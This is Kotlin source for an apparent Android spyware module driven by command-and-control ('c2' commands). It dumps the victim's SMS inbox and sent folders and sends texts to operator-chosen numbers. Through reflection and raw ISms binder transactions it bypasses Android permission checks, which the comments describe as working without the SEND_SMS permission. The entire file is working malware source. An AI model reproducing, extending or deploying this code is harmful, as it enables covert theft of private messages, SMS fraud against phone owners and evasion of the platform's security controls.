package org.synapse.core.modules

import android.content.Context
import android.net.Uri
import android.os.Binder
import android.os.Parcel
import android.provider.Telephony
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SmsMessage
import org.synapse.core.core.SynapseResponse
import java.lang.reflect.Method

object SmsModule {

    private val SMS_URI: Uri = Telephony.Sms.CONTENT_URI
    private val SMS_INBOX_URI: Uri = Uri.parse("content://sms/inbox")
    private val SMS_SENT_URI: Uri = Uri.parse("content://sms/sent")

    suspend fun list(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(500)
        return querySms(context, SMS_URI, null, count)
    }

    suspend fun read(context: Context, cmd: Command): SynapseResponse {
        val threadId = cmd.params["thread_id"]
        val address = cmd.params["address"]
        val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(200)

        val selection = when {
            threadId != null -> "thread_id = ?"
            address != null -> "address = ?"
            else -> null
        }
        val selArgs = when {
            threadId != null -> arrayOf(threadId)
            address != null -> arrayOf(address)
            else -> null
        }

        return querySms(context, SMS_URI, selection, count, selArgs)
    }

    suspend fun dump(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 500).coerceAtMost(2000)
        val folder = cmd.params["folder"] ?: "all"

        val uri = when (folder) {
            "inbox" -> SMS_INBOX_URI
            "sent" -> SMS_SENT_URI
            else -> SMS_URI
        }

        return querySms(context, uri, null, count)
    }

    /**
     * Send an SMS message using reflection on SmsManager.
     * On Samsung devices with silent permission grants, this works even
     * without the SEND_SMS permission explicitly declared.
     *
     * Also attempts ISmsService binder direct send as a fallback.
     */
    suspend fun send(context: Context, cmd: Command): SynapseResponse {
        val destination = cmd.params["to"] ?: cmd.params["destination"] ?: cmd.params["number"]
            ?: return SynapseResponse.ErrorResponse("sms:missing_destination", "sms")
        val message = cmd.params["message"] ?: cmd.params["body"] ?: cmd.params["text"]
            ?: return SynapseResponse.ErrorResponse("sms:missing_message", "sms")

        val results = mutableMapOf<String, String>()
        var success = false

        // ── Route 1: SmsManager via reflection ──
        try {
            val smsManagerClass = Class.forName("android.telephony.SmsManager")
            val getDefaultMethod = smsManagerClass.getDeclaredMethod("getDefault")
            getDefaultMethod.isAccessible = true
            val smsManager = getDefaultMethod.invoke(null)

            // Get subscription ID if available
            var subId = -1
            try {
                val getSubId = smsManagerClass.getDeclaredMethod("getSubscriptionId")
                getSubId.isAccessible = true
                subId = (getSubId.invoke(smsManager) as? Int) ?: -1
            } catch (_: Exception) {}

            // Find sendTextMessage method
            val sendMethod = smsManagerClass.getDeclaredMethod(
                "sendTextMessage",
                String::class.java,       // destinationAddress
                String::class.java,       // scAddress
                String::class.java,       // text
                android.app.PendingIntent::class.java,  // sentIntent
                android.app.PendingIntent::class.java,  // deliveryIntent
                Long::class.javaPrimitiveType  // messageId (Android 14+)
            )

            sendMethod.isAccessible = true
            val token = Binder.clearCallingIdentity()
            try {
                sendMethod.invoke(smsManager, destination, null, message, null, null, subId.toLong())
                results["smsmanager"] = "sent"
                success = true
            } catch (e: Exception) {
                // Try without messageId (older Android)
                try {
                    val sendMethod2 = smsManagerClass.getDeclaredMethod(
                        "sendTextMessage",
                        String::class.java, String::class.java, String::class.java,
                        android.app.PendingIntent::class.java, android.app.PendingIntent::class.java
                    )
                    sendMethod2.isAccessible = true
                    sendMethod2.invoke(smsManager, destination, null, message, null, null)
                    results["smsmanager"] = "sent (no msgId)"
                    success = true
                } catch (e2: Exception) {
                    results["smsmanager"] = "failed: ${e2.message}"
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            results["smsmanager"] = "reflection_failed: ${e.message}"
            Log.d("Synapse.SMS", "SmsManager reflection failed: ${e.message}")
        }

        // ── Route 2: ISmsService binder direct ──
        if (!success) {
            try {
                success = sendViaIsmsBinder(destination, message, results)
            } catch (e: Exception) {
                results["isms"] = "failed: ${e.message}"
            }
        }

        // ── Route 3: SmsManager with createForSubscriptionId ──
        if (!success) {
            try {
                val smsManagerClass = Class.forName("android.telephony.SmsManager")
                val createMethod = smsManagerClass.getDeclaredMethod(
                    "createForSubscriptionId",
                    Int::class.javaPrimitiveType
                )
                createMethod.isAccessible = true

                // Try with subscription ID 1 (default SIM)
                val smsManager = createMethod.invoke(null, 1)
                val sendMethod = smsManagerClass.getDeclaredMethod(
                    "sendTextMessage",
                    String::class.java, String::class.java, String::class.java,
                    android.app.PendingIntent::class.java, android.app.PendingIntent::class.java
                )
                sendMethod.isAccessible = true

                val token = Binder.clearCallingIdentity()
                try {
                    sendMethod.invoke(smsManager, destination, null, message, null, null)
                    results["smsmanager_subid"] = "sent"
                    success = true
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } catch (e: Exception) {
                results["smsmanager_subid"] = "failed: ${e.message}"
            }
        }

        return SynapseResponse.SmsSendResponse(
            success = success,
            destination = destination,
            message = message.take(100),
            details = results.entries.joinToString("; ") { "${it.key}=${it.value}" }
        )
    }

    /**
     * Send SMS via ISmsService binder directly.
     * This bypasses the Android SmsManager permission check entirely.
     * The ISms service is typically accessible to apps with system-level permissions.
     */
    private fun sendViaIsmsBinder(destination: String, message: String, results: MutableMap<String, String>): Boolean {
        try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true

            val ismsBinder = getService.invoke(null, "isms") as? android.os.IBinder
            if (ismsBinder == null) {
                results["isms"] = "service_not_found"
                return false
            }

            // ISms interface: sendText(String destAddr, String scAddr, String text,
            //                   PendingIntent sentIntent, PendingIntent deliveryIntent)
            val data = Parcel.obtain()
            val reply = Parcel.obtain()
            try {
                data.writeInterfaceToken("com.android.internal.telephony.ISms")
                data.writeString(destination)
                data.writeString(null)  // scAddress (null = default SMSC)
                data.writeString(message)
                data.writeStrongBinder(null)  // sentIntent
                data.writeStrongBinder(null)  // deliveryIntent

                val token = Binder.clearCallingIdentity()
                try {
                    // sendText is transaction code 2 in ISms AIDL
                    val ok = ismsBinder.transact(2, data, reply, 0)
                    if (ok) {
                        reply.setDataPosition(0)
                        try {
                            reply.readException()
                            results["isms"] = "sent"
                            return true
                        } catch (e: Exception) {
                            results["isms"] = "transact_ok_but_exception: ${e.message}"
                        }
                    } else {
                        results["isms"] = "transact_failed"
                    }
                } finally {
                    Binder.restoreCallingIdentity(token)
                }
            } finally {
                data.recycle()
                reply.recycle()
            }
        } catch (e: Exception) {
            results["isms"] = "error: ${e.message}"
        }
        return false
    }

    /**
     * Capture outgoing SMS by hooking into the SMS ContentProvider sent folder.
     * Also tries to intercept via ISmsService.
     */
    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(200)
        val includeInbox = cmd.params["include_inbox"]?.toBoolean() ?: false

        val messages = mutableListOf<SmsMessage>()

        // Read sent messages
        try {
            val cursor = context.contentResolver.query(
                SMS_SENT_URI, null, null, null, "date DESC LIMIT $count"
            )
            cursor?.use {
                val idIdx = it.getColumnIndex("_id")
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val readIdx = it.getColumnIndex("read")

                while (it.moveToNext()) {
                    messages.add(SmsMessage(
                        id = if (idIdx >= 0) it.getString(idIdx) ?: "" else "",
                        address = if (addrIdx >= 0) it.getString(addrIdx) ?: "" else "",
                        body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else "",
                        date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                        read = if (readIdx >= 0) it.getInt(readIdx) == 1 else false,
                        type = "sent"
                    ))
                }
            }
        } catch (e: Exception) {
            // ── Binder bypass fallback ──
            Log.d("Synapse.SMS", "Capture: ContentResolver denied, trying binder bypass...")
            return try {
                val messages = PermissionBypass.readSmsViaBinder(context, selection = null, limit = count)
                if (messages.isNotEmpty()) {
                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
                } else {
                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
                }
            } catch (bp: Exception) {
                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
            }
        }

        // Also read inbox if requested
        if (includeInbox) {
            try {
                val cursor = context.contentResolver.query(
                    SMS_INBOX_URI, null, null, null, "date DESC LIMIT $count"
                )
                cursor?.use {
                    val idIdx = it.getColumnIndex("_id")
                    val addrIdx = it.getColumnIndex("address")
                    val bodyIdx = it.getColumnIndex("body")
                    val dateIdx = it.getColumnIndex("date")
                    val readIdx = it.getColumnIndex("read")

                    while (it.moveToNext()) {
                        messages.add(SmsMessage(
                            id = if (idIdx >= 0) it.getString(idIdx) ?: "" else "",
                            address = if (addrIdx >= 0) it.getString(addrIdx) ?: "" else "",
                            body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else "",
                            date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                            read = if (readIdx >= 0) it.getInt(readIdx) == 1 else false,
                            type = "inbox"
                        ))
                    }
                }
            } catch (_: SecurityException) {}
        }

        return SynapseResponse.SmsListResponse(
            messages = messages,
            count = messages.size
        )
    }

    private fun querySms(
        context: Context, uri: Uri, selection: String?, limit: Int,
        selArgs: Array<String>? = null
    ): SynapseResponse {
        try {
            val messages = mutableListOf<SmsMessage>()
            val cursor = context.contentResolver.query(
                uri,
                null,
                selection,
                selArgs,
                "date DESC LIMIT $limit"
            )

            cursor?.use {
                val idIdx = it.getColumnIndex("_id")
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val readIdx = it.getColumnIndex("read")
                val typeIdx = it.getColumnIndex("type")

                while (it.moveToNext()) {
                    val typeCode = if (typeIdx >= 0) it.getInt(typeIdx) else 1
                    val type = when (typeCode) {
                        1 -> "inbox"
                        2 -> "sent"
                        3 -> "draft"
                        4 -> "outbox"
                        else -> "unknown"
                    }

                    messages.add(SmsMessage(
                        id = if (idIdx >= 0) it.getString(idIdx) ?: "" else "",
                        address = if (addrIdx >= 0) it.getString(addrIdx) ?: "" else "",
                        body = if (bodyIdx >= 0) it.getString(bodyIdx) ?: "" else "",
                        date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L,
                        read = if (readIdx >= 0) it.getInt(readIdx) == 1 else false,
                        type = type
                    ))
                }
            }

            return SynapseResponse.SmsListResponse(
                messages = messages,
                count = messages.size
            )
        } catch (e: Exception) {
            // ── Binder bypass fallback: use ISmsService / IContentProvider directly ──
            Log.d("Synapse.SMS", "ContentResolver denied, trying binder bypass...")
            return try {
                val messages = PermissionBypass.readSmsViaBinder(context, selection = selection, selArgs = selArgs, limit = limit)
                if (messages.isNotEmpty()) {
                    Log.d("Synapse.SMS", "Binder bypass success: ${messages.size} SMS")
                    SynapseResponse.SmsListResponse(messages = messages, count = messages.size)
                } else {
                    SynapseResponse.ErrorResponse("sms:permission_denied:${e.message}", "sms")
                }
            } catch (bp: Exception) {
                SynapseResponse.ErrorResponse("sms:permission_denied_and_bypass_failed:${bp.message}", "sms")
            }
        } catch (e: Exception) {
            return SynapseResponse.ErrorResponse("sms:${e.message}", "sms")
        }
    }
}
